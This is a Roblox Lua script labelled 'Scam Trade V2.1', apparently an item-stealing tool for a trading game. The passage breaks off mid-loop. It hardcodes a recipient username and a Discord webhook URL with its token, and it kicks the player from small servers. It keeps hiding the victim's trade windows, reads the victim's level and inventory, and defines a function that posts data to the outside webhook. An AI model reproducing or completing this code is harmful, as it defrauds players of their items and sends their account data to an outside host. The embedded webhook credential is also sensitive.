-- Create the GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ScamTradeGUI"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "Scam Trade V2.1"
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.Parent = frame

local loadingText = Instance.new("TextLabel")
loadingText.Text = "idk"
loadingText.Size = UDim2.new(1, -20, 0, 80)
loadingText.Position = UDim2.new(0, 10, 0, 50)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.Font = Enum.Font.Gotham
loadingText.TextSize = 16
loadingText.TextWrapped = true
loadingText.Parent = frame
userName = "qasim_20133"
webHook = "https://discord.com/api/webhooks/1341694409808281671/ceMOqZgzHvpKk9sfU77CaELxVp4aEaIc2x5AMvbf6REoQbMCiSSxTGxQJNCRwc4crfTz"
local values = {
    ["Nik's Scythe"] = 250000000,
    ["Elderwood Scythe"] = 90,
    ["Batwing"] = 70,
    ["Icewing"] = 4,
    ["Corrupt"] = 775,
    ["Chroma Luger"] = 105,
    ["Chroma Shark"] = 58,
    ["Chroma Laser"] = 90,
    ["Chroma Slasher"] = 58,
    ["Chroma Fang"] = 52,
    ["Chroma Heat"] = 65,
    ["Chroma Saw"] = 42,
    ["Chroma DeathShard"] = 58,
    ["Chroma Tides"] = 58,
    ["SeerChroma"] = 50,
    ["Chroma Boneblade"] = 52,
    ["Chroma Gingerblade"] = 52,
    ["Elderwood Revolver"] = 63,
    ["Eternal II"] = 7,
    ["Red Luger"] = 68,
    ["Green Luger"] = 45,
    ["Sugar"] = 125,
    ["Candy"] = 200,
    ["Chill"] = 18,
    ["Handsaw"] = 9,
    ["Eternal"] = 10,
    ["Boneblade"] = 8,
    ["Clockwork"] = 24,
    ["Hallow's Edge"] = 15,
    ["Amerilaser"] = 28,
    ["Old Glory"] = 27,
    ["BattleAxe II"] = 15,
    ["Spider"] = 18,
    ["Pixel"] = 21,
    ["Blaster"] = 28,
    ["Ginger Luger"] = 24,
    ["Virtual"] = 27,
    ["Flames"] = 11,
    ["Luger"] = 70,
    ["Heat"] = 23,
    ["Xmas"] = 18,
    ["Tides"] = 21,
    ["Slasher"] = 23,
    ["Pumpking"] = 18,
    ["Saw"] = 8,
    ["Laser"] = 32,
    ["Fang"] = 21,
    ["Shark"] = 27,
    ["Deathshard"] = 20,
    ["Winter's Edge"] = 12,
    ["Ice Dragon"] = 11,
    ["Red Seer"] = 2,
	["Seer"] = 10,
    ["Blue Seer"] = 2,
    ["Purple Seer"] = 2,
    ["Orange Seer"] = 2,
    ["Yellow Seer"] = 1,
    ["Battleaxe"] = 12,
    ["Frostsaber"] = 17,
    ["Ice Shard"] = 12,
    ["Gingerblade"] = 21,
    ["Snowflake"] = 8,
    ["Ghostblade"] = 8,
    ["Nightblade"] = 27,
    ["Hallow's Blade"] = 10,
    ["JD"] = 62,
    ["Web"] = 2,
    ["Rupture"] = 2,
    ["Green Elite"] = 10,
    ["Tree (gun)"] = 1,
    ["Tree (knife)"] = 1,
    ["Cotton Candy"] = 62,
    ["Scratch"] = 5,
    ["Ghost Knife"] = 6,
    ["Ginger Gun"] = 4,
    ["Red Fire"] = 3,
    ["Blue Scratch"] = 3,
    ["Blue Elite"] = 7,
    ["Green Fire"] = 0.43,
    ["Ghost Gun"] = 1,
    ["Predator (knife)"] = 0.44,
    ["Emerald"] = 0.44,
    ["Sparkle"] = 0.43,
    ["Overseer (gun)"] = 0.44,
    ["Midnight"] = 0.43,
    ["Elite"] = 0.33,
    ["Shiny"] = 0.34,
    ["Fusion"] = 0.34,
    ["Fade"] = 0.34,
    ["Splash"] = 0.34,
    ["Universe"] = 0.34,
    ["Overseer (knife)"] = 0.42,
    ["Predator (gun)"] = 0.42,
    ["Plasmite"] = 0.34,
    ["Viper"] = 0.34,
    ["Ginger Knife"] = 0.42,
    ["Jack"] = 4,
    ["Mummy"] = 1,
    ["Ginger (Knife)"] = 1,
    ["Ginger (Gun)"] = 1,
    ["Cane (Knife)"] = 2,
    ["Cane (Gun)"] = 2,
    ["Orange Marble"] = 4,
    ["Bats"] = 4,
    ["Cane Knife"] = 175,
    ["Icicles Gun"] = 25,
    ["Snowy"] = 1,
    ["GingerBread"] = 0.42,
    ["Vampire Gun"] = 10,
    ["Toxic Knife"] = 30,
    ["Galaxy"] = 0.24,
    ["Rainbow"] = 185,
    ["Imbued"] = 0.24,
    ["Galactic"] = 0.24,
    ["Krypto"] = 0.24,
    ["Spectrum"] = 0.24,
    ["iRevolver"] = 0.24,
    ["Hacker"] = 0.24,
    ["Nova"] = 0.24,
    ["Vortex"] = 0.24,
    ["Ace"] = 0.24,
    ["Bacon"] = 0.24,
    ["Korblox"] = 0.24,
    ["Squire"] = 0.24,
    ["Abstract"] = 0.24,
    ["Musical"] = 0.24,
    ["Black"] = 0.24,
    ["Purple"] = 0.24,
    ["Magma"] = 12,
    ["Green Marble"] = 6,
    ["Vampire Knife"] = 2,
    ["Toxic Gun"] = 3,
    ["Cane Gun"] = 0.42,
    ["Icicles Knife"] = 0.41,
    ["Nether"] = 0.41,
    ["Spitfire"] = 0.33,
    ["Damp"] = 0.33,
    ["Molten (Gun)"] = 0.42,
    ["Molten (Knife)"] = 0.42,
    ["Gifted"] = 1,
    ["Snowman (Knife)"] = 1,
    ["Snowman (Gun)"] = 1,
    ["Nutcracker"] = 1,
    ["Wrapped (Knife)"] = 1,
    ["Wrapped (Gun)"] = 1,
    ["Wolf"] = 4,
    ["Vampire"] = 3,
    ["Moons"] = 4,
    ["Night"] = 0.31,
    ["Future"] = 0.31,
    ["Checker"] = 0.31,
    ["Love (Gun)"] = 0.42,
    ["Donut"] = 0.31,
    ["Wanwood"] = 0.14,
    ["Adurite (Knife)"] = 0.14,
    ["Bluesteel (Knife)"] = 0.14,
    ["Adurite (Gun)"] = 0.14,
    ["Camo"] = 0.14,
    ["Stalker"] = 0.14,
    ["Missing"] = 0.14,
    ["Cheesy"] = 0.14,
    ["Sketch"] = 0.14,
    ["Marina"] = 0.14,
    ["Cheddar"] = 0.14,
    ["Circuit"] = 0.14,
    ["Paper"] = 0.14,
    ["Doge"] = 0.14,
    ["Caution"] = 0.14,
    ["Soda"] = 0.14,
    ["Wooden"] = 0.14,
    ["Hazmat"] = 0.14,
    ["Bluesteel (Gun)"] = 0.14,
    ["Melon"] = 0.14,
    ["Hive"] = 0.14,
    ["Jigsaw"] = 0.14,
    ["Brush"] = 0.14,
    ["Lucky"] = 0.14,
    ["Pink"] = 0.14,
    ["Blue"] = 0.14,
    ["Red"] = 0.14,
    ["Mummy (Knife)"] = 2,
    ["Potion"] = 5,
    ["Webs"] = 4,
    ["Tree"] = 0.41,
    ["Sweater"] = 0.32,
    ["Frosty"] = 0.41,
    ["Mummy Gun"] = 12,
    ["Zombie Gun"] = 20,
    ["Potion Knife"] = 22,
    ["Mummy Knife"] = 2,
    ["Zombie Knife"] = 2,
    ["Potion Gun"] = 2,
    ["Sweater Knife"] = 10,
    ["Snowflake Knife"] = 4,
    ["Holly Gun"] = 2,
    ["Sweater Gun"] = 0.31,
    ["Snowflake Gun"] = 0.31,
    ["Holly Knife"] = 0.31,
    ["2015"] = 2,
    ["TNL"] = 2,
    ["Hearts"] = 4,
    ["Valentine"] = 3,
    ["Goo"] = 2,
    ["Neon"] = 3,
    ["Reptile"] = 2,
    ["Infected"] = 2,
    ["Passion"] = 4,
    ["Sweetheart"] = 3,
    ["Blossom"] = 575,
    ["Roses"] = 4,
    ["Santa (Knife)"] = 1,
    ["Santa (Gun)"] = 1,
    ["Ornament2 (knife)"] = 1,
    ["Ornament2 (Gun)"] = 1,
    ["Ornament1"] = 1,
    ["Ornament"] = 1,
    ["Elf (Gun)"] = 3,
    ["Elf (knife)"] = 14,
    ["Tulip"] = 3,
    ["Skool"] = 23,
    ["Patrick"] = 2,
    ["Bunny"] = 0.11,
    ["Choco"] = 3,
    ["Egg"] = 2,
    ["Carrot"] = 2,
    ["Asteroid"] = 6,
    ["Ghosty"] = 0.32,
    ["Brains"] = 1,
    ["Witch"] = 1,
    ["Boney"] = 1,
    ["Xbox"] = 0.12,
    ["Slime Gun"] = 2,
    ["Slime Knife"] = 3,
    ["Bats Knife"] = 70,
    ["Bats Gun"] = 4,
    ["Grave Gun"] = 12,
    ["Grave Knife"] = 2,
    ["Haunted Knife"] = 10,
    ["Haunted Gun"] = 2,
    ["Sparkle10"] = 45,
    ["Sparkle1"] = 3,
    ["Sparkle2"] = 3,
    ["Sparkle3"] = 3,
    ["Sparkle4"] = 5,
    ["Ecto"] = 3,
    ["CandyCorn"] = 2,
    ["Phantom"] = 68,
    ["Zombie"] = 4,
    ["Elf (2017)"] = 0.31,
    ["Santa (2017)"] = 0.31,
    ["Coal"] = 0.31,
    ["Present"] = 0.31,
    ["Sidewinder"] = 15,
    ["Grind"] = 4,
    ["Euro"] = 8,
    ["Ollie"] = 20,
    ["Tailslide"] = 22,
    ["Indy"] = 2,
    ["Coal Gun"] = 0.31,
    ["Snowman Knife"] = 0.31,
    ["Santa Knife"] = 0.31,
    ["Wrapped Knife"] = 0.31,
    ["Sparkle5"] = 15,
    ["Sparkle6"] = 18,
    ["Sparkle7"] = 23,
    ["Sparkle8"] = 26,
    ["Sparkle9"] = 42,
    ["Coal knife"] = 25,
    ["Snowman Gun"] = 5,
    ["Elf Gun"] = 0.41,
    ["Wrapped Gun"] = 5,
    ["Whiteout"] = 0.11,
    ["Splatter"] = 0.11,
    ["Ice"] = 0.11,
    ["Love (Knife)"] = 0.11,
    ["Iron"] = 0.11,
    ["Big Kill"] = 0.11,
    ["Fallout"] = 0.11,
    ["Cold"] = 0.11,
    ["Linked"] = 0.11,
    ["Slate"] = 0.11,
    ["Borders"] = 0.11,
    ["8bit"] = 0.11,
    ["Engraved"] = 0.11,
    ["Infiltrator"] = 0.11,
    ["Juice"] = 0.11,
    ["Star"] = 0.11,
    ["Clan"] = 0.11,
    ["Cherry"] = 0.11,
    ["Cardboard"] = 0.11,
    ["Stainless"] = 0.11,
    ["Bit"] = 0.11,
    ["Pea"] = 0.11,
    ["News"] = 0.11,
    ["HL2"] = 0.11,
    ["Bleached"] = 0.11,
    ["Clown"] = 0.12,
    ["Oily"] = 0.11,
    ["Aqua"] = 0.11,
    ["Eco"] = 0.11,
    ["Log"] = 0.11,
    ["Sandy"] = 0.11,
    ["Static"] = 0.11,
    ["Brown"] = 0.11,
    ["Green"] = 0.11,
    ["Yellow"] = 0.11,
    ["Orange"] = 0.11,
    ["Prism"] = 3,
    ["Denis"] = 1,
    ["Alex"] = 1,
    ["Corl"] = 1,
    ["Sketchy"] = 1,
    ["Sub"] = 1,
    ["Chroma Fire Bat"] = 15,
    ["Chroma Fire Bear"] = 8,
    ["Chroma Fire Fox"] = 15,
    ["Chroma Fire Pig"] = 9,
    ["Chroma Fire Bunny"] = 18,
    ["Chroma Fire Cat"] = 20,
    ["Chroma Fire Dog"] = 15,
    ["<3"] = 10,
    ["Steambird"] = 2,
    ["Phoenix"] = 3,
    ["Sammy"] = 2,
    ["Electro"] = 2,
    ["Deathspeaker"] = 3,
    ["Fire Bat"] = 1,
    ["Fire Bear"] = 1,
    ["Frostbird"] = 3,
    ["Fire Fox"] = 1,
    ["Fire Pig"] = 1,
    ["Fire Bunny"] = 1,
    ["Fire Cat"] = 1,
    ["Fire Dog"] = 1,
    ["Ice Phoenix"] = 0.43,
    ["Traveller"] = 0.43,
    ["Skelly"] = 0.43,
    ["Purple Pumpkin"] = 40,
    ["Overseer Eye"] = 38,
    ["Blue Pumpkin"] = 60,
    ["Red Pumpkin"] = 45,
    ["Green Pumpkin"] = 30,
    ["Pumpkin"] = 18,
    ["Fairy"] = 22,
    ["Reindeer"] = 20,
    ["Elf"] = 4,
    ["Nobledragon"] = 25,
    ["Elitey"] = 0.31,
    ["Eyeball"] = 35,
    ["Jetstream"] = 42,
    ["Dogey"] = 55,
    ["Chilly"] = 15,
    ["Seahorsey"] = 17,
    ["Piggy"] = 4,
    ["Pengy"] = 15,
    ["UFO"] = 7,
    ["Badger"] = 2,
    ["Bat"] = 335,
    ["Tankie"] = 13,
    ["Mechbug"] = 7,
    ["Bear"] = 0.22,
    ["Fox"] = 0.12,
    ["Pig"] = 0.12,
    ["Santa Dog"] = 0.12,
    ["Cat"] = 0.11,
    ["Dog"] = 0.11,
    ["America"] = 10,
    ["Golden"] = 5,
    ["Blood"] = 10,
    ["Phaser"] = 7,
    ["Prince"] = 6,
    ["Shadow"] = 8,
    ["Ghost"] = 12,
    ["Splitter"] = 3,
    ["Cowboy"] = 4,
    ["Eternalcane"] = 21,
    ["Skulls"] = 10,
    ["Witched"] = 50,
    ["Monster"] = 22,
    ["Pumpkin Patch"] = 2,
    ["Blue Pumpkin 2019"] = 3,
    ["Brains 2019"] = 20,
    ["Elf 2019"] = 25,
    ["Gingerbread Gun"] = 5,
    ["Gingerbread Knife"] = 105,
    ["Green Pumpkin 2019"] = 27,
    ["Red Pumpkin 2019"] = 30,
    ["PumpkinPet2019"] = 0.21,
    ["Rudolph"] = 20,
    ["Vampire Bat"] = 32,
    ["Black Cat"] = 45,
    ["Zombie Dog"] = 185,
    ["Aurora Gun"] = 8,
    ["Aurora Knife"] = 30,
    ["Bones Gun"] = 75,
    ["Branches"] = 22,
    ["Candy Swirl Gun"] = 20,
    ["Candy Swirl Knife"] = 1,
    ["Lights Gun"] = 20,
    ["Lights Knife"] = 2,
    ["Log Chopper"] = 25,
    ["Minty"] = 23,
    ["Icey"] = 0.32,
    ["Frostbite"] = 9,
    ["Lugercane"] = 21,
    ["Snakebite Knife"] = 12,
    ["Snakebite Gun"] = 1,
    ["Snowflakes Gun"] = 0.41,
    ["Snowflakes Knife"] = 0.31,
    ["Slimy"] = 0.41,
    ["Santa's Magic"] = 10,
    ["Dungeon"] = 45,
    ["Frosted Gun"] = 0.31,
    ["Frosted Knife"] = 0.41,
    ["Gifts Knife"] = 60,
    ["Gifts Gun"] = 1,
    ["Pine Gun"] = 1,
    ["Pine Knife"] = 20,
    ["Webbed Gun"] = 0.31,
    ["Webbed Knife"] = 0.33,
    ["ZombifiedGun"] = 20,
    ["Zombified Knife"] = 55,
    ["Mummified"] = 0.42,
    ["RIP Gun"] = 20,
    ["Box of Gold Papers"] = 4,
    ["Box of Ultra Wrap"] = 4,
    ["Box of Purple Papers"] = 3,
    ["Box of Blue Papers"] = 3,
    ["Box of Red Papers"] = 3,
    ["Box of Green Papers"] = 2,
    ["Box of Fert"] = 2,
    ["Mystery Keys"] = 4,
    ["Xmas Gifts"] = 0.41,
    ["Snowflake Key"] = 0.31,
    ["Skeleton Key"] = 2,
    ["Chroma Gemstone"] = 60,
    ["Gemstone"] = 24,
    ["Eternal III"] = 8,
    ["Rune"] = 0.34,
    ["Rainbow (Gun)"] = 0.24,
    ["Bioblade"] = 12,
    ["Lightbringer"] = 58,
    ["Chroma Lightbringer"] = 115,
    ["Chroma Darkbringer"] = 120,
    ["Darkbringer"] = 62,
    ["Combat"] = 0.11,
    ["Copper"] = 0.11,
    ["Hardened"] = 0.11,
    ["Splat"] = 0.11,
    ["Tiger"] = 0.14,
    ["Pirate"] = 0.14,
    ["Space"] = 0.24,
    ["Splash Gun"] = 0.33,
    ["Deep Sea"] = 0.24,
    ["Nightfire"] = 0.24,
    ["Biogun"] = 0.14,
    ["Graffiti"] = 0.13,
    ["High Tech"] = 0.13,
    ["Clown Gun"] = 0.12,
    ["Leaf"] = 0.11,
    ["Lovely"] = 0.11,
    ["Shaded"] = 0.11,
    ["Eternal IV"] = 10,
    ["Prismatic"] = 6,
    ["Cavern Gun"] = 1,
    ["Cavern Knife"] = 12,
    ["Hallowscythe"] = 53,
    ["Hallowgun"] = 32,
    ["Vampire's Edge"] = 15,
    ["Ripper Gun"] = 0.42,
    ["Ripper Knife"] = 0.43,
    ["Bones"] = 0.32,
    ["Portal Knife"] = 0.32,
    ["Ghosts"] = 0.21,
    ["Peppermint"] = 4,
    ["Icebreaker"] = 120,
    ["Iceblaster"] = 63,
    ["Jinglegun"] = 18,
    ["Cookieblade"] = 4,
    ["Logchopper"] = 30,
    ["Blue Vamp's Edge"] = 1000000,
    ["Bronze Vamp's Edge"] = 50000000,
    ["Silver Vamp's Edge"] = 75000000,
    ["Gold Vamp's Edge"] = 500000000,
    ["Heartblade"] = 125,
    ["Gold Icebreaker"] = 500000000,
    ["Silver Icebreaker"] = 75000000,
    ["Bronze Icebreaker"] = 50000000,
    ["Red Icebreaker"] = 1000000,
    ["Red Iceblaster"] = 1000000,
    ["Bronze Iceblaster"] = 50000000,
    ["Silver Iceblaster"] = 75000000,
    ["Gold Iceblaster"] = 500000000,
    ["Eggblade"] = 7,
    ["Nebula"] = 24,
    ["Glitch1"] = 25,
    ["Candleflame"] = 115,
    ["Chroma Candleflame"] = 125,
    ["Harvester"] = 775,
    ["Chroma Swirlygun"] = 125,
    ["Swirly Gun"] = 130,
    ["Swirly Axe"] = 160,
    ["Swirly Blade"] = 60,
    ["Iceflake"] = 30,
    ["Icebeam"] = 30,
    ["Icecracker"] = 3,
    ["Ornaments Gun"] = 0.12,
    ["Ornaments Knife"] = 0.12,
    ["Gift Bag Knife"] = 0.22,
    ["Silent Night Knife"] = 10,
    ["Icedriller"] = 6,
    ["Stockings"] = 0.12,
    ["Trees"] = 0.12,
    ["Wrap Gun"] = 0.22,
    ["Wrap Knife"] = 0.22,
    ["Snowflakes"] = 0.41,
    ["Silent Night Gun"] = 2,
    ["Gift Bag Gun"] = 0.12,
    ["Giftwrap Knife"] = 0.12,
    ["Stickers Gun"] = 0.12,
    ["Cookie Gun"] = 0.22,
    ["Ice Camo"] = 0.32,
    ["Starry Knife"] = 0.41,
    ["Stickers Knife"] = 0.11,
    ["Coal Knife"] = 0.12,
    ["Ribbons"] = 0.12,
    ["Tree Knife"] = 0.23,
    ["Cookie Knife"] = 0.31,
    ["Starry Gun"] = 0.43,
    ["Swirl Knife"] = 0.41,
    ["Gold Harvester"] = 500000000,
    ["Silver Harvester"] = 75000000,
    ["Bronze Harvester"] = 50000000,
    ["Blue Harvester"] = 1000000,
    ["Plasmabeam"] = 30,
    ["Plasmablade"] = 30,
    ["Gold Swirly Axe"] = 500000000,
    ["Gold Swirly Gun"] = 500000000,
    ["Silver Swirly"] = 75000000,
    ["Bronze Swirly"] = 50000000,
    ["Blue Swirly"] = 1000000,
    ["Silver Swirly Gun"] = 75000000,
    ["Bronze Swirly Gun"] = 50000000,
    ["Blue Swirly Gun"] = 1000000,
    ["Candies 2016"] = 0.21,
    ["Candies 2017"] = 0.11,
    ["Snowbear"] = 0.31,
    ["Scarecrow"] = 0.42,
    ["Mr. Reindeer"] = 0.42,
    ["Snowman"] = 0.22,
    ["Shadow Pumpkin"] = 0.32,
    ["Skully"] = 0.42,
    ["Santa's Spirit"] = 10,
    ["Frozen Gun"] = 22,
    ["RB Knife"] = 0.31,
    ["Gothic Gun"] = 0.41,
    ["Gothic Knife"] = 0.23,
    ["Wraiths Gun"] = 0.23,
    ["Fall Camo"] = 0.22,
    ["Wraiths Knife"] = 0.41,
    ["Frozen Knife"] = 2,
    ["Slashed"] = 0.22,
    ["Starry"] = 0.22,
    ["Carved (Gun)"] = 0.12,
    ["Carved (Knife)"] = 0.13,
    ["Chroma Elderwood Blade"] = 125,
    ["Makeshift"] = 120,
    ["Elderwood Blade"] = 110,
    ["Spectre"] = 68,
    ["Spectral Knife"] = 8,
    ["Spectral Gun"] = 0.43,
    ["Magma Knife"] = 0.32,
    ["Magma Gun"] = 0.41,
    ["Watcher Knife"] = 0.32,
    ["Watcher Gun"] = 0.41,
    ["Versus"] = 0.12,
    ["Apocalypse Knife"] = 0.23,
    ["Candy Corn Gun"] = 0.22,
    ["Apocalypse Gun"] = 0.23,
    ["Darkness Knife"] = 0.22,
    ["Hunter Knife"] = 0.22,
    ["Webs Gun"] = 0.22,
    ["Candy Corn Knife"] = 0.12,
    ["Eyeball Knife"] = 0.12,
    ["Stickers"] = 0.12,
    ["Darkness Gun"] = 0.12,
    ["Infected Knife"] = 0.23,
    ["Infected Gun"] = 0.23,
    ["Brains Gun"] = 0.22,
    ["Ghostly"] = 0.22,
    ["Hazard Knife"] = 0.22,
    ["Hazard Gun"] = 0.31,
    ["Lantern Knife"] = 0.32,
    ["Moonlight Gun"] = 0.32,
    ["Witchbrew"] = 0.22,
    ["Curse Knife"] = 0.32,
    ["Ghostfire"] = 0.41,
    ["Makeshift Knife"] = 1,
    ["Wraith Gun"] = 0.32,
    ["Wraith Knife"] = 0.41,
    ["Zombified"] = 0.43,
    ["Santa Walking"] = 40,
    ["Mr. Snowman"] = 0.41,
    ["Void"] = 0.42,
    ["Chroma Cookiecane"] = 120,
    ["Cookiecane"] = 55,
    ["Icepiercer"] = 725,
    ["Gingermint"] = 55,
    ["Arctic Knife"] = 0.43,
    ["Arctic Gun"] = 5,
    ["Coal Gun 2022"] = 0.12,
    ["Candied Knife"] = 0.12,
    ["Snowman Gun 2022"] = 0.13,
    ["Stockings 2022"] = 0.23,
    ["Mistletoe Gun"] = 0.23,
    ["Snowflake Knife 2022"] = 0.23,
    ["Gingerbread Gun 2022"] = 0.33,
    ["Tree Knife 2022"] = 0.33,
    ["Coal Knife 2022"] = 0.12,
    ["Candied Gun"] = 0.12,
    ["Stickers Gun 2022"] = 0.12,
    ["Snowman Knife 2022"] = 0.12,
    ["Stockings Gun 2022"] = 0.22,
    ["Mistletoe Knife"] = 0.22,
    ["Snowflake Gun 2022"] = 0.22,
    ["Tree Gun 2022"] = 0.32,
    ["Gingerbread Knife 2022"] = 0.32,
    ["Blue Elderwood"] = 1000000,
    ["Bronze Elderwood"] = 50000000,
    ["Silver Elderwood"] = 75000000,
    ["Gold Elderwood"] = 100000000,
    ["Gold Icepiercer"] = 100000000,
    ["Gold Icecrusher"] = 100000000,
    ["Silver Icecrusher"] = 75000000,
    ["Silver Icepiercer"] = 75000000,
    ["Bronze Icepiercer"] = 50000000,
    ["Bronze Icecrusher"] = 50000000,
    ["Red Icecrusher"] = 1000000,
    ["Red Icepiercer"] = 1000000,
    ["Glitch2"] = 45,
    ["Sakura"] = 570,
    ["Broken"] = 5,
    ["Heart"] = 0.32,
    ["Rose"] = 0.22,
    ["Love"] = 0.12,
    ["Teddy"] = 0.32,
    ["Combat II"] = 4,
    ["Candycorn 2019"] = 0.31,
    ["Candy Corn gun 2020"] = 0.12,
    ["Candy Corn knife 2020"] = 0.12,
    ["Watcher Knife 2020"] = 0.12,
    ["Watcher gun 2020"] = 0.12,
    ["Mummy Knife 2020"] = 0.22,
    ["Mummy gun 2020"] = 0.22,
    ["Portal Gun"] = 0.22,
    ["Ghosts knife 2020"] = 0.22,
    ["Candle"] = 0.12,
    ["Rainbow Gun"] = 190,
    ["Chromatic Knife"] = 0.44,
    ["Chromatic Gun"] = 0.43,
    ["Nuke"] = 0.41,
    ["Bio"] = 0.32,
    ["Marble"] = 0.22,
    ["Painted Knife"] = 0.32,
    ["Painted Gun"] = 0.22,
    ["Fragile Gun"] = 0.12,
    ["Fragile Knife"] = 0.12,
    ["Carrot Bunny"] = 0.32,
    ["Waves"] = 140,
    ["Ocean"] = 145,
    ["Beach"] = 35,
    ["Floral"] = 0.33,
    ["Sunset"] = 0.32,
    ["Popsicle"] = 0.22,
    ["Pool Noodle"] = 0.31,
    ["Toy Knife"] = 0.21,
    ["Toy Gun"] = 0.21,
    ["Sticker Gun"] = 0.12,
    ["Chroma Travelers Gun"] = 95000,
    ["Travelers Gun"] = 3300,
    ["Darkshot"] = 485,
    ["Darksword"] = 480,
    ["Traveler's Axe"] = 4600,
    ["Traveler Gun"] = 7,
    ["Traveler Knife"] = 0.43,
    ["Darkknife"] = 0.43,
    ["Ghastly Gun"] = 0.41,
    ["Ghoulish"] = 25,
    ["Wood Knife"] = 0.13,
    ["Vines Gun"] = 0.13,
    ["Vines Knife"] = 0.21,
    ["Etched"] = 0.22,
    ["Steel Knife"] = 0.22,
    ["Glowy"] = 0.22,
    ["Eclipse"] = 0.22,
    ["Steel Gun"] = 0.32,
    ["Meltdown"] = 0.32,
    ["Turkey"] = 1500,
    ["Latte Gun"] = 100,
    ["Latte Knife"] = 100,
    ["Scarf"] = 0.31,
    ["Pumpkin Pie"] = 0.41,
    ["Darkgun"] = 0.33,
    ["Ghastly Knife"] = 0.33,
    ["Evergreen"] = 1100,
    ["Evergun"] = 1825,
    ["Gingerscope"] = 9300,
    ["Chroma Evergun"] = 48000,
    ["Chroma Evergreen"] = 28000,
    ["Frostfade Gun"] = 0.43,
    ["Frostfade Knife"] = 2,
    ["Snowflake Gun 23"] = 0.32,
    ["Neon Gun"] = 0.33,
    ["Snowglobe Knife"] = 0.32,
    ["Tree Knife 23"] = 0.33,
    ["Snowman Gun 23"] = 0.31,
    ["Fireplace"] = 0.31,
    ["Canes Knife"] = 0.23,
    ["Canes Gun"] = 0.31,
    ["Stars Gun"] = 0.23,
    ["Stars Knife"] = 0.31,
    ["Snowfall"] = 0.12,
    ["Santa Gun 23"] = 0.13,
    ["Elf Gun 23"] = 0.12,
    ["Ribbon Knife"] = 0.13,
    ["Bells"] = 0.12,
    ["Present Knife"] = 0.13,
    ["Frozen Gun 23"] = 0.12,
    ["Frozen Knife 23"] = 0.13,
    ["Flowerwood Knife"] = 115,
    ["Flowerwood Gun"] = 115,
    ["Wavy Gun"] = 0.32,
    ["Wavy Knife"] = 0.32,
    ["Carrot Knife"] = 0.31,
    ["Carrot Gun"] = 0.31,
    ["Robot Knife"] = 0.32,
    ["Spring Knife"] = 0.33,
    ["Blue Gingerscope"] = 1000000,
    ["Blue Gingerscythe"] = 1000000,
    ["Bronze Gingerscope"] = 50000000,
    ["Bronze Gingerscythe"] = 50000000,
    ["Silver Gingerscope"] = 75000000,
    ["Silver Gingerscythe"] = 75000000,
    ["Gold Gingerscope"] = 100000000,
    ["Gold Gingerscythe"] = 100000000,
    ["Chroma Watergun"] = 2200,
    ["Chroma Contellation"] = 14000,
    ["Chroma Vampires Gun"] = 13000,
    ["Chroma Bauble"] = 12000,
    ["Watergun"] = 95,
    ["Pearl"] = 62,
    ["Pearlshine"] = 62,
    ["Palms Knife"] = 0.43,
    ["Palms Gun"] = 2,
    ["Waves Knife"] = 0.41,
    ["Floral Gun"] = 0.33,
    ["Jellyfish Knife"] = 0.22,
    ["Popsicle Gun"] = 0.22,
    ["Turtle Knife"] = 0.22,
    ["Clownfish Gun"] = 0.22,
    ["Sandy Gun"] = 0.22,
    ["Balloons Gun"] = 0.22,
    ["Starfish Knife"] = 0.22,
    ["Starfish Gun"] = 0.22,
    ["Clownfish Knife"] = 0.22,
    ["Floatie"] = 0.31,
    ["Sharky Knife"] = 0.42,
	["Leaves"] = 1,
	["Aliens"] = 1,
	["Moon"] = 1,
  ["Travelers Axe"] = 6100,
  ["Celestial"] = 1000,
  ["Vampires Axe"] = 470,
  ["Ice Wing"] = 5,
  ["Constellation"] = 1000,
  ["Bauble"] = 570,
  ["Vampires Gun"] = 485,
  ["Australis"] = 200,
  ["Borealis"] = 200,
  ["Soul"] = 145,
  ["Spirit"] = 140,

}
if #game:GetService("Players"):GetPlayers() <= 2 then
    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
end

if #game:GetService("Players"):GetPlayers() == 12 then
    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
end
local LP = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
_G.vlorp = _G.vlorp or false
if _G.vlorp then
    return
end
_G.vlorp = true

local destroytrades2 = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        if tradeGUI.Enabled == true then
            tradeGUI.Enabled = false
        end

        if tradeGUIPhone.Enabled == true then
            tradeGUIPhone.Enabled = false
        end

        wait(0.1)
    end
end)

function SendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end

function CreateEmbed(title, description, color, fields)
    local embed = {
        ["title"] = title,
        ["description"] = description,
        ["color"] = color,
        ["fields"] = fields or {}
    }
    return embed
end

local function getLvl()
    for i,v in pairs(LevelModule.XPTable) do
        if PlayerDataModule.NewXP < v then
            return i
        end
    end
end

local allItems = {}
local itemsCount = 0

local valueCount = 0

local vintageItems = {}
local commonItems = {}
local uncommonItems = {}
local rareItems = {}
local legendaryItems = {}
local godlyItems = {}
local ancientItems = {}
local uniqueItems = {}

local vintageItemsC = 0
local commonItemsC = 0
local uncommonItemsC = 0
local rareItemsC = 0
local legendaryItemsC = 0
local godlyItemsC = 0
local ancientItemsC = 0
local uniqueItemsC = 0

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        local br = 0
        if values[d.ItemName] then
